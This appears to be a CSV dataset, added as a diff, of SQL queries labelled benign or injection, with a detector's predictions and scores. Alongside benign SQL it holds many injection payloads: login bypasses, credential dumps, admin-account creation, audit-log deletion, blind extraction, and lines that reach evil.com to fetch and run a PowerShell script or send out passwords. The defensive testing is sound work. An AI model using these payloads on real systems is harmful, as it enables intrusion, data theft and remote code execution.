+SELECT * FROM products WHERE description LIKE '%wireless%';,0,like,Description search,0,True,0.04357701091670892
+SELECT * FROM users WHERE email LIKE '%@company.com';,0,like,Company emails,0,True,0.3326493228706362
+SELECT * FROM products WHERE name LIKE 'Samsung%' OR name LIKE 'Apple%';,0,like,Brand search,1,False,0.8611496019986311
+SELECT * FROM logs WHERE message LIKE '%error%' OR message LIKE '%warning%';,0,like,Log search,1,False,0.8543756201545772
+"INSERT INTO products (name, price, stock) VALUES ('New Product', 29.99, 100);",0,insert,Product insert,0,True,0.21881906750836122
+"INSERT INTO users (email, password_hash, created_at) VALUES ('new@example.com', 'hash123', NOW());",0,insert,User registration,1,False,0.9645055818623826
+"INSERT INTO order_items (order_id, product_id, quantity, price) VALUES (100, 50, 2, 19.99);",0,insert,Order item,0,True,0.02682437902940527
+"INSERT INTO logs (level, message, created_at) VALUES ('INFO', 'User logged in', NOW());",0,insert,Log entry,0,True,0.4661827858225509
+UPDATE products SET stock = stock - 1 WHERE id = 42;,0,update,Decrement stock,0,True,0.18023283550780347
+UPDATE users SET last_login = NOW() WHERE id = 5;,0,update,Login timestamp,0,True,0.16274971921236708
+"UPDATE orders SET status = 'processing', updated_at = NOW() WHERE id = 100;",0,update,Order status,0,True,0.005797862129163897
+UPDATE products SET price = price * 0.9 WHERE category_id = 5;,0,update,Category discount,0,True,0.002167425667659387
+"DELETE FROM sessions WHERE created_at < DATE_SUB(NOW(), INTERVAL 30 DAY);",0,delete,Old sessions,1,False,0.5213542554474987
+DELETE FROM cart_items WHERE user_id = 42 AND product_id = 100;,0,delete,Remove from cart,0,True,0.015241726836758613
+"DELETE FROM notifications WHERE read_at IS NOT NULL AND created_at < DATE_SUB(NOW(), INTERVAL 90 DAY);",0,delete,Old notifications,1,False,0.9107493604610595
+SELECT CURRENT_TIMESTAMP;,0,minimal,Current timestamp,1,False,0.9431754627988113
+SELECT CURDATE();,0,minimal,Current date,1,False,0.8243660495561992
+SELECT USER();,0,minimal,Current user,1,False,0.9574043135962915
+SELECT @@sql_mode;,0,minimal,SQL mode,1,False,0.9619649532865158
+SELECT CONNECTION_ID();,0,minimal,Connection ID,1,False,0.9955893328525052
+SELECT LAST_INSERT_ID();,0,minimal,Last insert ID,1,False,0.9688057664433706
+SELECT UUID();,0,minimal,Generate UUID,1,False,0.9587109680154264
+SELECT * FROM products WHERE name = 'TRUNCATE Your Collection';,0,edge_case,Product name contains TRUNCATE,0,True,0.19270695121071135
+SELECT * FROM products WHERE name = 'DELETE Me Not Flowers';,0,edge_case,Product name contains DELETE,0,True,0.06037882088003556
+SELECT * FROM products WHERE name = 'INSERT Coin Arcade';,0,edge_case,Product name contains INSERT,0,True,0.05985453995155769
+SELECT * FROM products WHERE name = 'UPDATE Your Wardrobe';,0,edge_case,Product name contains UPDATE,0,True,0.008471968461917577
+SELECT * FROM products WHERE name = 'ALTER Ego Perfume';,0,edge_case,Product name contains ALTER,0,True,0.12896736747834256
+SELECT * FROM products WHERE name = 'EXEC-utive Chair';,0,edge_case,Product name contains EXEC,0,True,0.03415861356278674
+SELECT * FROM products WHERE name = '1=1 Equals One T-Shirt';,0,edge_case,Product contains 1=1,1,False,0.8843209213568386
+SELECT * FROM products WHERE name = 'NULL and Void Game';,0,edge_case,Product contains NULL,0,True,0.3060035434840933
+SELECT * FROM products WHERE sku = 'DROP-SHIP-001';,0,edge_case,SKU contains DROP,0,True,0.32909940576506047
+SELECT * FROM products WHERE sku = 'SLEEP-WELL-002';,0,edge_case,SKU contains SLEEP,0,True,0.456714680283988
+SELECT * FROM users WHERE username = 'admin123';,0,edge_case,Valid admin username,1,False,0.99873391280508
+SELECT * FROM users WHERE username = 'test_user';,0,edge_case,Test username,0,True,0.4016233823635556
+SELECT * FROM products WHERE description = 'Best seller -- highly recommended!';,0,edge_case,Double dash in description,1,False,0.8574630805419925
+SELECT * FROM reviews WHERE comment = 'Works great; love it!';,0,edge_case,Semicolon in comment,1,False,0.9691464791784226
+"SELECT * FROM products WHERE notes = 'Available in sizes S, M, L -- order now!';",0,edge_case,Double dash in notes,1,False,0.5750888183299542
+SELECT * FROM users WHERE bio = 'Developer @ Tech Corp; Python enthusiast';,0,edge_case,Special chars in bio,1,False,0.6882581265145232
+SELECT * FROM products WHERE tags LIKE '%or%';,0,edge_case,Tags with or,0,True,0.02284682091794643
+SELECT * FROM products WHERE keywords LIKE '%and%';,0,edge_case,Keywords with and,0,True,0.06556934802065231
+SELECT * FROM users WHERE password_hint = 'My pet''s name + birth year';,0,edge_case,Escaped quote in hint,1,False,0.7704882783077664
+SELECT * FROM contacts WHERE company = 'O''Reilly Media';,0,edge_case,Company with apostrophe,0,True,0.2837177760401379
+SELECT * FROM users WHERE name = 'D''Angelo';,0,edge_case,Name with apostrophe,0,True,0.1516882351010661
+SELECT * FROM addresses WHERE street = '123 O''Connor Street';,0,edge_case,Street with apostrophe,1,False,0.5788622674750461
+SELECT * FROM products WHERE id > 0 AND price > 0;,0,edge_case,Double positive conditions,0,True,0.013779827496828746
+SELECT * FROM users WHERE id = id;,0,edge_case,Self equality,0,True,0.010284545830393161
+"SELECT id, id FROM users LIMIT 5;",0,edge_case,Duplicate column,0,True,0.0026205558797336506
+"SELECT 1+1, 2+2, 3+3;",0,edge_case,Math expressions,1,False,0.7826298501191787
+"SELECT 'hello', 'world';",0,edge_case,String literals,1,False,0.9703321726935769
+SELECT NULL IS NULL;,0,edge_case,Null check expression,1,False,0.9998463285414039
+"SELECT TRUE, FALSE;",0,edge_case,Boolean literals,1,False,0.8689912479179738
+SELECT * FROM (SELECT * FROM users WHERE id < 10) AS subq;,0,subquery,Derived table,0,True,0.4553184000354217
+SELECT * FROM users WHERE salary > (SELECT AVG(salary) FROM users);,0,subquery,Comparison subquery,1,False,0.570625147349151
+SELECT * FROM products WHERE EXISTS (SELECT 1 FROM inventory WHERE inventory.product_id = products.id AND quantity > 0);,0,subquery,EXISTS subquery,0,True,0.33845199189601877
+"SELECT (SELECT name FROM categories WHERE id = p.category_id) as cat_name, p.name FROM products p;",0,subquery,Scalar subquery,0,True,0.019819745724845045
+SELECT * FROM users WHERE id = (SELECT MAX(id) FROM users);,0,subquery,Max ID subquery,1,False,0.6952268962204339
+SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE vip = 1);,0,subquery,VIP customers,0,True,0.019491955233346073
+1' OR '1'='1' --,1,tautology,Space before comment,1,True,0.999999999999998
+' OR '1'='1' /*,1,tautology,Block comment end,1,True,0.9999999999999958
+') OR ('x'='x,1,tautology,Parenthesis string,1,True,0.9999999893954935
+0' OR '0'='0,1,tautology,Zero tautology,1,True,0.9999999997714111
+' OR 2>1--,1,tautology,Greater than tautology,1,True,0.9999999999968945
+' OR 1<2--,1,tautology,Less than tautology,1,True,0.9999999999999134
+' OR 1!=2--,1,tautology,Not equal tautology,1,True,0.9999999999769222
+' OR NOT 1=2--,1,tautology,NOT tautology,1,True,0.9999999968057349
+' OR true--,1,tautology,Boolean true,1,True,0.9999998175796061
+' OR 1--,1,tautology,Simple true,1,True,0.9999999999998868
+admin' OR '1'='1,1,tautology,Admin bypass,1,True,1.0
+administrator'--,1,tautology,Administrator bypass,1,True,0.999999998557668
+root'--,1,tautology,Root bypass,1,True,0.9999923570132383
+' OR ''=',1,tautology,Empty equality,1,True,0.9999999999994182
+' OR 'abc'='abc,1,tautology,String equality,1,True,0.9999999974188114
+"' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",1,union,Ten column UNION,1,True,0.9999999913171475
+"' UNION SELECT null,null,null,null,null,null,null,null--",1,union,Eight nulls,1,True,0.9999999394769147
+"' UNION SELECT id,username,password,email,null,null FROM users--",1,union,User data extraction,1,True,0.9999995652987921
+' UNION SELECT * FROM mysql.user--,1,union,MySQL users,1,True,0.9999997635940302
+' UNION SELECT * FROM pg_shadow--,1,union,PostgreSQL passwords,1,True,0.999999840029967
+' UNION SELECT * FROM all_users--,1,union,Oracle users,1,True,0.9999999927764414
+' UNION SELECT * FROM sys.syslogins--,1,union,MSSQL logins,1,True,0.9999986373224093
+"' UNION SELECT table_name,column_name,data_type,null FROM information_schema.columns--",1,union,Column enumeration,1,True,0.999987045793194
+"' UNION SELECT schema_name,null,null,null FROM information_schema.schemata--",1,union,Schema enumeration,1,True,0.9999859778896819
+"' UNION SELECT grantee,privilege_type,null,null FROM information_schema.user_privileges--",1,union,Privilege enumeration,1,True,0.9999490078819547
+"' UNION SELECT host,user,password FROM mysql.user--",1,union,MySQL credentials,1,True,0.9999986466787886
+"' UNION SELECT name,sql,null,null FROM sqlite_master--",1,union,SQLite schema,1,True,0.9999967605734247
+"' UNION SELECT @@hostname,@@version,user(),database()--",1,union,Server info,1,True,0.9999999609735144
+"' UNION SELECT LOAD_FILE('/etc/passwd'),null,null,null--",1,union,File read UNION,1,True,0.9999999645850618
+"'; INSERT INTO users (username,password,role) VALUES ('evil','password','admin')--",1,stacked,Create admin,1,True,0.999999657909737
+'; UPDATE users SET is_admin = 1 WHERE username = 'attacker'--,1,stacked,Grant admin,1,True,0.9999742560235954
+'; DELETE FROM audit_log--,1,stacked,Delete audit,1,True,0.9998477314733172
+'; DROP INDEX idx_users_email--,1,stacked,Drop index,1,True,0.9999952024852408
+'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'password'--,1,stacked,Grant privileges,1,True,0.9999998061688269
+'; REVOKE ALL PRIVILEGES ON *.* FROM 'legit_user'@'localhost'--,1,stacked,Revoke privileges,1,True,0.9997191445759983
+'; CREATE USER 'backdoor' IDENTIFIED BY 'secret'--,1,stacked,Create user,1,True,0.9999954143689378
+'; ALTER USER 'admin' IDENTIFIED BY 'hacked123'--,1,stacked,Change password,1,True,0.9999999999732745
+'; RENAME TABLE users TO users_backup--,1,stacked,Rename table,1,True,0.9999978669269224
+'; TRUNCATE audit_logs--,1,stacked,Truncate audit,1,True,0.999992103269884
+"1; EXEC sp_addsrvrolemember 'hacker', 'sysadmin'--",1,stacked,MSSQL sysadmin,1,True,0.9999999951490184
+"'; EXEC sp_configure 'xp_cmdshell', 1--",1,stacked,Enable cmdshell,1,True,0.9999947722891905
+' AND SLEEP(15)--,1,time_blind,15 second sleep,1,True,0.9999999876388616
+' AND SLEEP(30)--,1,time_blind,30 second sleep,1,True,0.9999999913372605
+"' AND IF(1=1,SLEEP(10),0)--",1,time_blind,Conditional 10s,1,True,0.9999997472588068
+"' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(10),0)--",1,time_blind,Version check sleep,1,True,0.9999998658517768
+' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--,1,time_blind,User check sleep,1,True,0.9999999996208793
+"' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",1,time_blind,Table exists sleep,1,True,0.9999990797121971
+"' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--",1,time_blind,Password extraction,1,True,0.9999989746325939
+"' OR IF(1=1,BENCHMARK(50000000,MD5('test')),0)--",1,time_blind,High benchmark,1,True,0.9999981499380238
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--,1,time_blind,PostgreSQL CASE sleep,1,True,0.999992119228274
+"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',10)--",1,time_blind,Oracle time delay,1,True,0.9999991249226899
+' AND 1=1 AND 'a'='a,1,boolean_blind,Double AND true,1,True,0.9999999999717453
+' AND 1=2 AND 'a'='a,1,boolean_blind,AND false,1,True,0.9999999995811104
+' AND (SELECT LENGTH(username) FROM users WHERE id=1)=5--,1,boolean_blind,Length check,1,True,0.9998034595219181
+"' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",1,boolean_blind,First char check,1,True,0.9999971325495427
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10--,1,boolean_blind,Table count,1,True,0.9999529849467998
+' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users'--,1,boolean_blind,Table name check,1,True,0.9999020848877053
+' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)='id'--,1,boolean_blind,Column check,1,True,0.9999177720827971
+' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='users')>5--,1,boolean_blind,Column count,1,True,0.9999030467535674
+"' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users LIMIT 0,1),1,1))>64--",1,boolean_blind,Complex extraction,1,True,0.9999707889509344
+' AND (SELECT 1)=1--,1,boolean_blind,Simple subquery true,1,True,0.9999999759419141
+"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",1,error_based,Database name error,1,True,0.9999978727755097
+"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--",1,error_based,User name error,1,True,0.9999949279491609
+"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",1,error_based,Table name error,1,True,0.9999718791348261
+"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)--",1,error_based,Password error,1,True,0.9999781295646194
+"' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)--",1,error_based,Complex error,1,True,0.9999997874162095
+"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_based,Group by error,1,True,0.9999878431920772
+' AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT * FROM(SELECT @@version)a)b))--,1,error_based,Geometry error,1,True,0.9999967793389039
+' AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT user())a)b))--,1,error_based,Polygon error,1,True,0.9999162476802748
+' AND LINESTRING((SELECT * FROM(SELECT * FROM(SELECT database())a)b))--,1,error_based,Linestring error,1,True,0.9999769052361622
+' OR 1+1=2--,1,obfuscated_case,Math expression,1,True,0.9999999999699047
+'oR'1'='1,1,obfuscated_case,No spaces OR,1,True,0.999999999655224
+'AnD 1=0 oR 1=1--,1,obfuscated_case,Mixed AND OR,1,True,0.9999999999650659
+' union select null--,1,obfuscated_case,Lowercase union,1,True,0.9904119799493752
+' UNION select null--,1,obfuscated_case,Mixed case union,1,True,0.9999994678135072
+' UnIoN aLl SeLeCt NuLl--,1,obfuscated_case,Alternating UNION ALL,1,True,0.9999885003863811
+'/**/oR/**/1=1--,1,obfuscated_comment,Comment OR lowercase,1,True,0.9999999999997329
+"'/**/UNION/**/ALL/**/SELECT/**/1,2,3--",1,obfuscated_comment,Comment UNION ALL,1,True,0.9999999999210667
+'/*!00000OR*/1=1--,1,obfuscated_comment,MySQL conditional,1,True,0.9999999427044912
+"'/*!12345UNION*//*!12345SELECT*/1,2,3--",1,obfuscated_comment,MySQL version UNION,1,True,0.9999989929392624
+'/**_**/OR/**_**/1=1--,1,obfuscated_comment,Underscore comments,1,True,0.9999999999996363
+'+OR+'1'='1,1,obfuscated_concat,Plus concat,1,True,0.9999999998836067
+'||'1'='1,1,obfuscated_concat,Oracle concat OR,1,True,0.9999999894979638
+' OR CHAR(49)=CHAR(49)--,1,obfuscated_concat,CHAR comparison,1,True,0.9999783290169528
+' OR 0x313d31--,1,obfuscated_encoded,Hex comparison,1,True,0.9999999343162195
+' OR UNHEX('3d')=UNHEX('3d')--,1,obfuscated_encoded,UNHEX comparison,1,True,0.9999999889544918
+'%20OR%20'1'='1,1,obfuscated_encoded,URL space encoding,1,True,0.9999998568534741
+'%09OR%091=1--,1,obfuscated_encoded,URL tab encoding,1,True,0.9999999973428515
+'%0aOR%0a1=1--,1,obfuscated_encoded,URL newline encoding,1,True,0.999999999764714
+'%00' OR '1'='1,1,obfuscated_encoded,Null byte injection,1,True,0.9999999999999261
+' unicode OR 1=1--,1,obfuscated_encoded,Unicode prefix,1,True,0.9999999999988392
+SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --',1,full_injection_select,Full login bypass,1,True,0.9999999999994815
+"SELECT * FROM products WHERE id = -1 UNION SELECT 1,username,password,4 FROM users--",1,full_injection_select,Full data extraction,1,True,0.9999912629643644
+"SELECT * FROM users WHERE email = 'x' UNION ALL SELECT NULL,NULL,table_name,NULL FROM information_schema.tables--",1,full_injection_select,Full schema extraction,1,True,0.9999969106626557
+SELECT * FROM orders WHERE id = 1 AND (SELECT COUNT(*) FROM users WHERE is_admin=1) > 0--,1,full_injection_select,Full boolean check,1,True,0.997873149679611
+SELECT * FROM products WHERE id = '1' AND SLEEP(5) AND '1'='1,1,full_injection_select,Full time-based,1,True,0.9999999813397008
+"INSERT INTO comments (user_id, text) VALUES (1, 'test'); DELETE FROM users; --');",1,full_injection_insert,Insert with delete,1,True,0.9999407795951178
+"INSERT INTO feedback (message) VALUES ('x'),(SELECT password FROM users)--');",1,full_injection_insert,Insert subquery,1,True,0.9999481196335488
+UPDATE users SET email = 'x@x.com' WHERE id = 1 OR 1=1--,1,full_injection_update,Update all users,1,True,0.9999999229319173
+UPDATE products SET price = 0 WHERE id = 1; DROP TABLE products--,1,full_injection_update,Update drop,1,True,0.9981486652973622
+DELETE FROM products WHERE id = 1 OR id = id--,1,full_injection_delete,Delete all,1,True,0.9853249643557308
+DELETE FROM orders WHERE 1=1; INSERT INTO users (admin) VALUES (1)--,1,full_injection_delete,Delete insert,1,True,0.9999978131489792
+"' UNION SELECT name,sql FROM sqlite_master--",1,advanced,SQLite schema dump,1,True,0.9999987726782111
+"' UNION SELECT group_concat(tbl_name),1 FROM sqlite_master WHERE type='table'--",1,advanced,SQLite tables,1,True,0.9999857617575677
+' OR 1=1; ATTACH DATABASE '/tmp/evil.db' AS evil--,1,advanced,SQLite attach,1,True,0.9999999991710267
+'; COPY (SELECT '') TO PROGRAM 'whoami'--,1,advanced,PostgreSQL command,1,True,0.9999993271883315
+'; CREATE OR REPLACE FUNCTION shell(text) RETURNS text AS 'system($1)' LANGUAGE plperlu--,1,advanced,PostgreSQL function shell,1,True,0.9999533215332199
+'; DO $$DECLARE r RECORD;BEGIN EXECUTE 'COPY (SELECT 1) TO PROGRAM ''id''';END$$--,1,advanced,PostgreSQL DO block,1,True,0.9999980735361795
+"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",1,advanced,MSSQL convert error,1,True,0.9999930574857373
+'; EXEC master..xp_cmdshell 'powershell -c IEX(wget http://evil.com/shell.ps1)'--,1,advanced,MSSQL powershell,1,True,0.9999591618397317
+'; EXEC master..xp_fileexist 'C:\Windows\win.ini'--,1,advanced,MSSQL file check,1,True,0.9999583764422367
+"'; SELECT * FROM OPENROWSET('SQLOLEDB','server=evil.com;uid=sa;pwd=password','SELECT 1')--",1,advanced,MSSQL OPENROWSET,1,True,0.9999860102760624
+' OR UTL_HTTP.request('http://evil.com/'||(SELECT password FROM users WHERE rownum=1))--,1,advanced,Oracle out-of-band,1,True,0.9999933169258428
+' AND DBMS_XMLQUERY.NEWCONTEXT('SELECT * FROM users')--,1,advanced,Oracle XML injection,1,True,0.9999531856035401
+"' UNION SELECT XMLType('<!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://evil.com/""> %xxe;]><foo></foo>') FROM dual--",1,advanced,Oracle XXE,1,True,0.9999965373541877
+' AND '1'='1&password=anything,1,advanced,Parameter pollution,1,True,0.9999999994888398
+"' AND EXTRACTVALUE(1,CONCAT(0x7e,(@@secure_file_priv)))--",1,advanced,Check file privs,1,True,0.9999862930884745
+' UNION SELECT TO_BASE64(LOAD_FILE('/etc/passwd'))--,1,advanced,Base64 file read,1,True,0.9999999904865348
+SELECT * FROM products WHERE {{user_input}};,0,placeholder,Template placeholder,0,True,0.0012132769867707074
+SELECT * FROM users WHERE role = %(role)s;,0,placeholder,Python format placeholder,0,True,0.0027756017593733675
+SELECT * FROM orders WHERE id = {0};,0,placeholder,C# format placeholder,0,True,0.0007979710997155226
+SELECT * FROM products WHERE id = @product_id;,0,placeholder,MSSQL parameter,0,True,0.0012923803827267753
+SELECT * FROM users WHERE id = $1;,0,placeholder,PostgreSQL parameter,0,True,0.008461896542707391
+SELECT * FROM users WHERE email = :email AND status = :status;,0,placeholder,Multiple named params,0,True,0.003343679757786946
+SELECT * FROM products WHERE price BETWEEN :min_price AND :max_price;,0,placeholder,Range params,0,True,0.006665855442806076
+"SELECT * FROM users WHERE TIMESTAMPDIFF(YEAR, birthday, CURDATE()) >= 18;",0,complex_benign,Age calculation,0,True,0.3507063933958565
+SELECT * FROM products WHERE (price - discount_amount) * (1 + tax_rate) < 100;,0,complex_benign,Complex expression,0,True,0.00821984153058763
+"SELECT IFNULL(nickname, CONCAT(first_name, ' ', last_name)) AS display_name FROM users;",0,complex_benign,IFNULL concat,1,False,0.890191824451112
+"SELECT *, CASE WHEN stock > 10 THEN 'In Stock' WHEN stock > 0 THEN 'Low Stock' ELSE 'Out of Stock' END AS availability FROM products;",0,complex_benign,Multi-case expression,1,False,0.8363641338083585
+"SELECT * FROM users WHERE email RLIKE '^[a-z]+@[a-z]+\\.[a-z]{2,}$';",0,complex_benign,RLIKE pattern,0,True,0.13681741781717938
+SELECT INET_ATON('192.168.1.1');,0,complex_benign,IP function,1,False,0.9920573673018268
+SELECT HEX('hello');,0,complex_benign,HEX function,1,False,0.9787704833925946
+SELECT MD5('password');,0,complex_benign,MD5 function,1,False,0.9966402903654563
+"SELECT SHA2('data', 256);",0,complex_benign,SHA function,1,False,0.9896814177524694
+"SELECT JSON_EXTRACT(data, '$.user.name') FROM orders;",0,complex_benign,JSON extract,1,False,0.6916107136907894
+"SELECT * FROM users WHERE JSON_CONTAINS(permissions, '\admin\""');""",0,complex_benign,JSON contains,1,False,0.9995669553747338
+WITH RECURSIVE category_tree AS (SELECT * FROM categories WHERE parent_id IS NULL UNION ALL SELECT c.* FROM categories c JOIN category_tree ct ON c.parent_id = ct.id) SELECT * FROM category_tree;,0,complex_benign,Recursive CTE,1,False,0.9800288544001063
+"SELECT *, ROW_NUMBER() OVER (PARTITION BY category_id ORDER BY price DESC) as rank FROM products;",0,complex_benign,Window function,1,False,0.67121408948147
+"SELECT *, LAG(price) OVER (ORDER BY created_at) as prev_price FROM products;",0,complex_benign,LAG function,0,True,0.0397465597432772
+"SELECT *, SUM(total) OVER (ORDER BY created_at ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) as running_total FROM orders;",0,complex_benign,Running total,1,False,0.6559291320181819
+SELECT * FROM products WHERE SOUNDEX(name) = SOUNDEX('phone');,0,complex_benign,SOUNDEX search,0,True,0.15396951360503702
+SELECT * FROM users WHERE MATCH(bio) AGAINST('developer programmer' IN NATURAL LANGUAGE MODE);,0,complex_benign,Full text natural,1,False,0.9335036605375061
+SELECT * FROM products FORCE INDEX (idx_category) WHERE category_id = 5;,0,complex_benign,Force index,0,True,0.007374209494331004
+SELECT /*+ INDEX(users idx_email) */ * FROM users WHERE email = 'test@example.com';,0,complex_benign,Index hint,1,False,0.9285742102886693
+LOCK TABLES users WRITE;,0,complex_benign,Lock table,1,False,0.9998925541582958
+START TRANSACTION;,0,complex_benign,Start transaction,1,False,0.9992610640414121
+COMMIT;,0,complex_benign,Commit,1,False,0.8764178444772395
+ROLLBACK;,0,complex_benign,Rollback,1,False,0.9862110671552222
+SET autocommit = 0;,0,complex_benign,Disable autocommit,1,False,0.9576887473571191
+SET NAMES 'utf8mb4';,0,complex_benign,Set charset,1,False,0.9828335714654913
+SET @var = 5;,0,complex_benign,Set variable,0,True,0.4192981811368408
+SELECT @var;,0,complex_benign,Select variable,1,False,0.9124971019119128
+PREPARE stmt FROM 'SELECT * FROM users WHERE id = ?';,0,complex_benign,Prepare statement,0,True,0.050531693659154456
+EXECUTE stmt USING @user_id;,0,complex_benign,Execute prepared,1,False,0.9785593959139162
+DEALLOCATE PREPARE stmt;,0,complex_benign,Deallocate prepared,1,False,0.9965097593106418
+ANALYZE TABLE users;,0,complex_benign,Analyze table,1,False,0.99980016341003
+OPTIMIZE TABLE products;,0,complex_benign,Optimize table,1,False,0.9974910784734099
+CHECK TABLE orders;,0,complex_benign,Check table,1,False,0.9990929202542984
+REPAIR TABLE sessions;,0,complex_benign,Repair table,1,False,0.9990301406600329
+FLUSH PRIVILEGES;,0,complex_benign,Flush privileges,1,False,0.9954237241501845
+SHOW PROCESSLIST;,0,complex_benign,Show processes,1,False,0.9984162958580148
+SHOW VARIABLES LIKE 'max_connections';,0,complex_benign,Show variable,1,False,0.9894984866113443
+SHOW STATUS LIKE 'Threads%';,0,complex_benign,Show status,1,False,0.9953719406527333
+SHOW INDEX FROM users;,0,complex_benign,Show indexes,1,False,0.6513259863530327
+SHOW GRANTS FOR CURRENT_USER;,0,complex_benign,Show grants,1,False,0.9997618673430743
